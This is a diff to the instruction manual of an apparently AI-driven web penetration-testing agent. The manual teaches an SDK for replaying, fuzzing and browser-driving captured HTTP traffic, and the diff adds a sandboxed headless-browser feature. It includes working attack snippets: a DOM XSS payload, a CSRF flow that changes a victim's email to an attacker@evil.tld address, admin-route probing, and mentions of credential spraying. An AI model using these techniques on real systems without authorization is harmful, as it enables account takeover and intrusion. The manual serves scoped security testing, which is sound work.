@@ -3,7 +3,7 @@
 You are inside `proxy_brain`: you write Python, and `redamon` is pre-imported.
 `redamon` is your ONLY I/O — the corpus of captured HTTP traffic and the live
 replay path both flow through it. There is no menu of fixed tools; there is a
-language. If Burp Suite can do it, you can code it here — you compose the
+language. If an interactive web proxy can do it, you can code it here — you compose the
 primitives below into any capability you need.
 
 Read this first, then read one deep section right before you write the code for
@@ -13,7 +13,7 @@ that technique: `print(redamon.manual("jwt"))`, `redamon.manual("sqli")`, etc.
 ### THE SDK (exact signatures — this is the whole surface)
 
 READ (no traffic, tenant-scoped for you, returns text or objects):
-- `redamon.search(filters=None, **kwargs) -> [Txn]` — Burp history. Pass a dict
+- `redamon.search(filters=None, **kwargs) -> [Txn]` — HTTP history. Pass a dict
   `search({"host":"x","hasAuth":True,"method":"POST"})` or kwargs
   `search(host="x", has_auth=True)`. Filters: host, method, status,
   statusClass/status_class ("2xx".."5xx"), tool, source ("recon"/"agent"),
@@ -48,6 +48,12 @@ ACTIVE (LIVE TRAFFIC — see LIMITS below):
 - `redamon.fuzz(id, insertion_point, payloads) -> [Response]` — iterate payloads
   over ONE query-param name; one Response per payload (server caps the count).
   (For header/body/path/cookie fuzzing, loop `replay` yourself.)
+- `redamon.browser(id) -> Browser` — a real chromium PINNED to the host of txn
+  `id`, for signals that only exist AFTER JavaScript runs (DOM XSS, SPA routes,
+  JS-minted CSRF). Drive it: `.goto(path)` `.click(sel)` `.fill(sel,val)`
+  `.submit(sel)` `.eval(js)` (budgeted actions); read `.dom()` `.text(sel)`
+  `.alerts()` `.console()` `.url()` (free — the oracle). Always `.close()`.
+  Read `manual("browser")` first. Do NOT drive it from a parallel `batch`.
 
 RESULT:
 - `redamon.finding(kind, txn_id, evidence=None, severity="medium")` — record a finding.
@@ -56,25 +62,26 @@ RESULT:
 `Response` fields: `.status` (int|None), `.headers` (lowercased dict), `.body` (str),
 `.length` (int), `.payload` (the fuzz payload, if any). `Txn` fields: `.id` `.raw` `.method` `.status` `.url` `.host` `.path`.
 
-### BURP → HOW YOU BUILD IT (the mental model)
+### WEB-PROXY WORKFLOWS → HOW YOU BUILD THEM (the mental model)
 
-You reproduce Burp's whole workflow by composing the SDK in code:
+You reproduce a web proxy's whole workflow by composing the SDK in code:
 
-| Burp tool | Build it with |
+| Workflow | Build it with |
 |---|---|
-| HTTP history / Target | `redamon.search(...)`, `redamon.sitemap()`, `redamon.query(...)` |
-| Repeater | `redamon.replay(id, {...})` |
-| Intruder (Sniper/Ram/Pitchfork/Cluster) | `redamon.fuzz` or loops over `redamon.replay`; see `manual("intruder")` |
-| Comparer | `redamon.diff(a, b)` (and compare `.length`/`.body`/`.status` in code) |
-| Sequencer | collect a token N times, compute entropy in Python; see `manual("sequencer")` |
-| Decoder / JWT Editor | `redamon.decode(v)`, `redamon.jwt(tok).forge(...)` |
-| Autorize (access control) | replay every request under a 2nd identity, `diff` vs baseline; `manual("authz")` |
-| Turbo Intruder / race | `redamon.batch(id, [...]*N, parallel=True)`; `manual("race")` |
-| Param Miner | brute param/header names, diff vs baseline; `manual("cache")` |
-| HTTP Request Smuggler | find candidates; confirm raw via kali_shell (proxy normalises framing); `manual("smuggling")` |
-| Grep-Match / Grep-Extract | read `.body`/`.status`/`.length` per Response; that IS your oracle |
+| HTTP history / site map | `redamon.search(...)`, `redamon.sitemap()`, `redamon.query(...)` |
+| Resend a request with tweaks | `redamon.replay(id, {...})` |
+| Payload fuzzing sweep | `redamon.fuzz` or loops over `redamon.replay`; see `manual("intruder")` |
+| Compare two responses | `redamon.diff(a, b)` (and compare `.length`/`.body`/`.status` in code) |
+| Token entropy analysis | collect a token N times, compute entropy in Python; see `manual("sequencer")` |
+| Decode / forge tokens | `redamon.decode(v)`, `redamon.jwt(tok).forge(...)` |
+| Access-control diffing | replay every request under a 2nd identity, `diff` vs baseline; `manual("authz")` |
+| Concurrent race testing | `redamon.batch(id, [...]*N, parallel=True)`; `manual("race")` |
+| Hidden parameter mining | brute param/header names, diff vs baseline; `manual("cache")` |
+| Request smuggling | find candidates; confirm raw via kali_shell (proxy normalises framing); `manual("smuggling")` |
+| Grep and extract from responses | read `.body`/`.status`/`.length` per Response; that IS your oracle |
+| Post-JS / DOM / client-side signal | `redamon.browser(id)` then `.dom()`/`.alerts()`/`.console()`; `manual("browser")` |
 
-The boundary is your own code — it's Python. Anything Burp automates, you script.
+The boundary is your own code — it's Python. Anything a web proxy automates, you script.
 
 ### THE ORACLE PATTERN (the core skill)
 
@@ -96,6 +103,11 @@ to a baseline. That fact is your oracle. Examples:
   work in any phase).
 - **Per-session send budget** (default 1000 live requests). Keep batches tight; a
   bisection or a race of hundreds is fine, a blind 100k sweep is not.
+- **`browser` is separately gated**: same host-pin + exploitation-only, plus its own
+  per-session ACTION budget (default 100). Opening a browser AND every goto/click/
+  eval each cost one unit; free reads (`.dom()`/`.alerts()`/…) don't. A `.goto` to a
+  different host/port/scheme is refused, and a redirect off the pinned origin aborts
+  the run. At most 3 browsers may be open at once — `.close()` each when done.
 - **180s wall-clock** per proxy_brain run. Long campaigns = several runs.
 - **Output is truncated.** Aggregate in code; print a few distilled lines, never raw bodies.
 - **Everything you send is re-captured** (isReplay lineage) and egress-guarded.
@@ -131,6 +143,8 @@ to a baseline. That fact is your oracle. Examples:
 - **cors** — CORS misconfig: origin reflection + null-origin trust.
 - **xxe** — XML external entity in-band file read.
 - **auth** — credential attacks: password spray/stuffing, session fixation.
+- **browser** — drive a real chromium; read the rendered DOM/console/alerts as the
+  oracle (DOM XSS, SPA-only routes, JS-minted CSRF then hand off to `replay`).
 - **report** — turn a confirmed finding into evidence (finding + to_curl).
 
 ## recon — map the surface and pick your target
@@ -510,3 +524,50 @@ if pre and post and pre.split(";")[0] == post.split(";")[0]:
     redamon.finding("session-fixation", t.id, severity="medium")
 # credential stuffing = spray breached user:pass pairs (pitchfork over two lists).
 ```
+
+## browser — the rendered-DOM oracle (DOM XSS, SPA, JS flows)
+
+Use this ONLY when the signal lives in the page AFTER JavaScript runs — a value
+curl never sees because curl never executes JS. If the payload already reflects in
+the raw response body, use `replay`/`fuzz` (cheaper, no browser). `browser(id)`
+opens a real chromium PINNED to txn `id`'s host; find that id with `search` first.
+
+Budgeted actions (each costs one of ~100 per session, and so does opening the
+browser): `.goto(path)` `.click(sel)` `.fill(sel,val)` `.submit(sel)`
+`.press(sel,key)` `.eval(js)`. Free reads (the oracle, no budget): `.dom()`
+`.text(sel)` `.html(sel)` `.console()` `.alerts()` `.url()`. Always `.close()`
+(at most 3 browsers open at once). Never drive it from `batch(parallel=True)`
+(sync Playwright is not thread-safe).
+
+```python
+# DOM-based XSS: the sink runs in JS, so alert() firing is the confirmation.
+t = redamon.search(host="target.tld")[0]        # any captured txn on the host
+b = redamon.browser(t.id)
+b.goto("/profile#name=<img src=x onerror=alert(1)>")   # payload in the hash, read by JS
+if b.alerts():                                          # a dialog fired -> executed
+    redamon.finding("dom-xss", t.id, evidence=str(b.alerts()), severity="high")
+b.close()
+```
+
+```python
+# SPA route only reachable through the app's own JS navigation.
+b = redamon.browser(t.id)
+b.goto("/app"); b.click("a[href='#/admin']")
+print(b.text("main")[:800])                     # rendered admin view, if authz is broken
+b.close()
+```
+
+```python
+# JS-minted CSRF token -> hand the value to replay for the real exploit request.
+b = redamon.browser(t.id)
+b.goto("/settings")
+token = b.eval("document.querySelector('input[name=csrf]').value")
+b.close()
+r = redamon.replay(t.id, {"param": {"csrf": token, "email": "attacker@evil.tld"}})
+```
+
+Notes: a `.goto` off the pinned host is refused server-side; a click that navigates
+off-host aborts the run. Sub-resources the page loads are egress-guarded, not
+host-pinned. Everything the browser fetches is re-captured as
+`tool=proxy_brain_browser`, so you can `search(tool="proxy_brain_browser")` to see
+exactly what it generated and then `replay` any of it.
